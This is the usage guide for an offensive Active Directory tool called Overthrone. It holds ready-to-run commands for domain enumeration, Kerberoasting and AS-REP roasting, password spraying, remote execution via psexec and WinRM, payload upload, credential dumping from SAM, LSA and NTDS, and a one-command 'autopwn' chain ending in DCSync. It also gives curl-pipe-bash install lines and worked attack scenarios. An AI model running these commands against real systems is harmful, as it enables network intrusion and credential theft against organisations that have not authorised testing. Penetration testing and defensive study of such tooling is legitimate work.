# Usage Guide

So you want to overthrow a domain. Good for you. This guide covers all the commands, shortcuts, and practical examples you need to go from zero to Domain Admin.

## The Short Version

```bash
# Enumerate everything
ovt reaper -d dc01.corp.local -D corp.local -u jsmith -p 'Password1'

# Find attack paths to DA
ovt graph path-to-da -f jsmith

# Kerberoast
ovt krb roast

# Autopwn - the "I have a meeting in an hour" option
ovt auto -d dc01.corp.local -D corp.local -u jsmith -p 'Password1'

# Check your environment
ovt doctor
```

## Installation

### One-liner (Linux/macOS)

```bash
curl -fsSL https://raw.githubusercontent.com/Karmanya03/Overthrone/main/install.sh | bash
```

### One-liner (Windows PowerShell)

```powershell
irm https://raw.githubusercontent.com/Karmanya03/Overthrone/main/install.ps1 | iex
```

### From Source

```bash
git clone https://github.com/Karmanya03/Overthrone.git
cd Overthrone
cargo build --release
```

Binaries at `target/release/overthrone` and `target/release/ovt`. Same binary, two names. Because typing is work.

## Global Flags

These work with every command.

| Flag | Short | Description | Env Variable |
|------|-------|-------------|--------------|
| `--dc-host` | `-H` | Domain controller hostname/IP | `OT_DC_HOST` |
| `--domain` | `-D` | Target domain | `OT_DOMAIN` |
| `--username` | `-u` | Domain username | `OT_USERNAME` |
| `--password` | `-p` | Password | `OT_PASSWORD` |
| `--nt-hash` | | NT hash for PtH | `OT_NTHASH` |
| `--ticket` | | Kerberos ticket file | `KRB5CCNAME` |
| `--auth-method` | `-A` | Auth method (password/ntlm/kerberos) | |
| `--verbose` | `-v` | Verbosity (-v, -vv, -vvv) | |
| `--output` | `-o` | Output format (text/json/csv) | |
| `--outfile` | `-O` | Output file path | |

## Commands Reference

### `ovt doctor` - Environment Check

Checks your environment for dependencies and connectivity. Run this first when things aren't working.

```bash
ovt doctor                           # Check all environment deps
ovt doctor -c smb,kerberos           # Check specific components
ovt doctor --dc 10.10.10.1           # Test connectivity to a DC
```

**What it checks:**
- Platform features (SMB, WinRM, NTLM support)
- smbclient availability (Linux/macOS)
- libsmbclient library (Linux/macOS)
- Kerberos configuration
- WinRM adapters
- Network connectivity (when `--dc` specified)

**Exit codes:** 0 if all checks pass, 1 if any fail.

---

### `ovt reaper` (alias: `enum`) - Full Enumeration

Enumerates everything in the domain via LDAP. Users, groups, computers, GPOs, trusts, ACLs, the works.

```bash
ovt reaper -d dc01.corp.local -D corp.local -u jsmith -p 'Password1'
ovt enum -d 10.10.10.1 -D corp.local -u jsmith -p 'Password1' -m users,groups
```

| Flag | Short | Description |
|------|-------|-------------|
| `--dc-ip` | | DC IP address (alternative to --dc-host) |
| `--modules` | `-m` | Specific modules to run (comma-separated) |
| `--page-size` | | LDAP page size (default: 500) |

**Available modules:** `users`, `groups`, `computers`, `trusts`, `spns`, `acls`, `gpos`, `ous`, `delegations`, `laps`, `mssql`, `adcs`

---

### `ovt kerberos` (alias: `krb`) - Kerberos Operations

Kerberos authentication, ticket requests, and roasting.

#### `ovt krb roast` - Kerberoasting

Request TGS tickets for SPN accounts and output crackable hashes.

```bash
ovt krb roast -d dc01.corp.local -D corp.local -u jsmith -p 'Password1'
ovt krb roast --spn MSSQLSvc/sql01.corp.local:1433
```

Output is in hashcat format (mode 13100).

#### `ovt krb asrep-roast` - AS-REP Roasting

Request AS-REP for accounts that don't require pre-auth.

```bash
ovt krb asrep-roast -d dc01.corp.local -D corp.local -u jsmith -p 'Password1'
```

Output is in hashcat format (mode 18200).

#### `ovt krb get-tgt` - Request TGT

Request a Ticket Granting Ticket.

```bash
ovt krb get-tgt -d dc01.corp.local -D corp.local -u jsmith -p 'Password1'
```

Saves TGT to `{username}_tgt.kirbi`.

#### `ovt krb get-tgs` - Request TGS

Request a Service Ticket.

```bash
ovt krb get-tgs --spn cifs/fileserver.corp.local -d dc01 -D corp.local -u jsmith -p 'Pass'
```

---

### `ovt smb` - SMB Operations

SMB file operations and share enumeration.

#### `ovt smb shares` - List Shares

```bash
ovt smb shares -t 10.10.10.50 -D corp.local -u jsmith -p 'Password1'
```

#### `ovt smb admin` - Check Admin Access

```bash
ovt smb admin -t 10.10.10.50,10.10.10.51 -D corp.local -u admin -p 'Pass123'
```

Checks if you have admin access (C$/ADMIN$) on target(s).

#### `ovt smb spider` - Find Interesting Files

```bash
ovt smb spider -t 10.10.10.50 --extensions .kdbx,.key,.pem,.config
```

Searches shares for files matching extensions.

#### `ovt smb get` - Download File

```bash
ovt smb get -t 10.10.10.50 -p 'C$/Windows/Temp/secret.txt'
```

#### `ovt smb put` - Upload File

```bash
ovt smb put -t 10.10.10.50 -l payload.exe -r 'C$/Temp/payload.exe'
```

---

### `ovt exec` - Remote Command Execution

Execute commands on remote hosts via various methods.

```bash
ovt exec -t 10.10.10.50 -c "whoami /all" -m winrm
ovt exec -t 10.10.10.50 -c "hostname" -m psexec
ovt exec -t 10.10.10.50 -c "ipconfig" -m smbexec
```

| Method | Description |
|--------|-------------|
| `auto` | Try methods in order (default) |
| `psexec` | Service-based execution |
| `smbexec` | SMB-based execution |
| `wmiexec` | WMI-based execution |
| `winrm` | WinRM/WS-Man |

---

### `ovt graph` - Attack Graph

Build and query the attack graph.

#### `ovt graph build` - Build Graph

```bash
ovt graph build -d dc01.corp.local -D corp.local -u jsmith -p 'Password1'
```

Enumerates via LDAP and builds the attack graph. Saves to `overthrone_graph.json`.

#### `ovt graph path` - Find Path Between Nodes

```bash
ovt graph path -f jsmith -t "Domain Admins"
```

#### `ovt graph path-to-da` - Find Paths to Domain Admins

```bash
ovt graph path-to-da -f jsmith
```

Finds all shortest paths from the user to Domain Admins.

#### `ovt graph stats` - Graph Statistics

```bash
ovt graph stats
```

Shows node counts by type.

#### `ovt graph export` - Export Graph

```bash
ovt graph export -o attack-graph.json
```

---

### `ovt spray` - Password Spraying

Spray a password against multiple users. Respects lockout policies.

```bash
ovt spray -d dc01.corp.local -D corp.local -p 'Spring2026!' --userlist users.txt
ovt spray -d dc01 -D corp.local -p 'Welcome1' --userlist users.txt --delay 5 --jitter 500
```

| Flag | Description |
|------|-------------|
| `--password` | Password to spray |
| `--userlist` | File with usernames (one per line) |
| `--delay` | Seconds between attempts (default: 1) |
| `--jitter` | Random ms to add (default: 0) |

---

### `ovt auto` (alias: `auto-pwn`) - Autonomous Attack Chain

The "hold my beverage" mode. Enumerates, plans, exploits, persists, and reports.

```bash
ovt auto -d dc01.corp.local -D corp.local -u jsmith -p 'Password1'
ovt auto -d dc01 -D corp.local -u jsmith -p 'Pass' --target "Enterprise Admins"
ovt auto -d dc01 -D corp.local -u jsmith -p 'Pass' --stealth --dry-run
```

| Flag | Short | Description |
|------|-------|-------------|
| `--target` | `-t` | Goal: "Domain Admins" (default), "ntds", "recon" |
| `--method` | `-m` | Execution method (auto/psexec/smbexec/wmiexec/winrm) |
| `--stealth` | | Enable stealth mode (quieter techniques) |
| `--dry-run` | | Plan only, don't execute |

---

### `ovt dump` - Credential Dumping

Dump credentials from remote systems.

```bash
ovt dump -t 10.10.10.50 --source sam
ovt dump -t dc01.corp.local --source ntds
```

| Source | Description |
|--------|-------------|
| `sam` | Local SAM database |
| `lsa` | LSA secrets |
| `ntds` | NTDS.DIT (DC only) |
| `dcc2` | Domain Cached Credentials v2 |

---

### `ovt wizard` - Interactive Wizard

Guided interactive mode for AD engagements.

```bash
ovt wizard
```

Walks through target selection, credential entry, attack selection, and execution.

---

## Environment Variables

Set these once and forget them:

```bash
export OT_DC_HOST=dc01.corp.local
export OT_DOMAIN=corp.local
export OT_USERNAME=jsmith
export OT_PASSWORD='Password1'
```

Then commands get shorter:

```bash
ovt reaper    # Uses env vars
ovt graph build
ovt auto
```

---

## Exit Codes

| Code | Meaning |
|------|---------|
| 0 | Success |
| 1 | Failure (check error message) |
| 2 | Invalid arguments |

---

## Examples

### Scenario 1: Initial Foothold

```bash
# 1. Check environment
ovt doctor

# 2. Enumerate
ovt reaper -d dc01.corp.local -D corp.local -u jsmith -p 'Phished123!'

# 3. Find attack paths
ovt graph path-to-da -f jsmith

# 4. Kerberoast discovered SPN
ovt krb roast --spn MSSQLSvc/db01.corp.local

# 5. Crack and use
# ... crack hash with hashcat ...
ovt exec -t dc01 -c "whoami" -m psexec -D corp.local -u svc_backup -p 'Backup2019!'
```

### Scenario 2: Password Spray

```bash
# Extract usernames from enumeration
ovt reaper -d dc01 -D corp.local -u jsmith -p 'Pass' -o enum.json
# jq '.users[].sam_account_name' enum.json > users.txt

# Spray
ovt spray -d dc01 -D corp.local -p 'Corp2026!' --userlist users.txt --delay 3

# Found valid creds? Enumerate as that user
ovt reaper -d dc01 -D corp.local -u mrodriguez -p 'Corp2026!'
```

### Scenario 3: Full Autopwn

```bash
ovt auto -d dc01.corp.local -D corp.local -u jsmith -p 'Summer2026!'

# Go get coffee. Come back to:
# - Full enumeration
# - Attack graph built
# - Exploitation executed
# - DCSync completed
# - Report generated
```

---

## Platform Notes

### Linux/macOS

Install `smbclient` for SMB directory listing:

```bash
# Debian/Ubuntu/Kali
sudo apt install smbclient libsmbclient-dev

# macOS
brew install samba
```

### Windows

Everything works out of the box. Native SMB via SSPI, native WinRM via Win32 API.

---

## Need More Help?

```bash
ovt --help
ovt reaper --help
ovt krb --help
```

The `--help` menus are comprehensive and always up to date.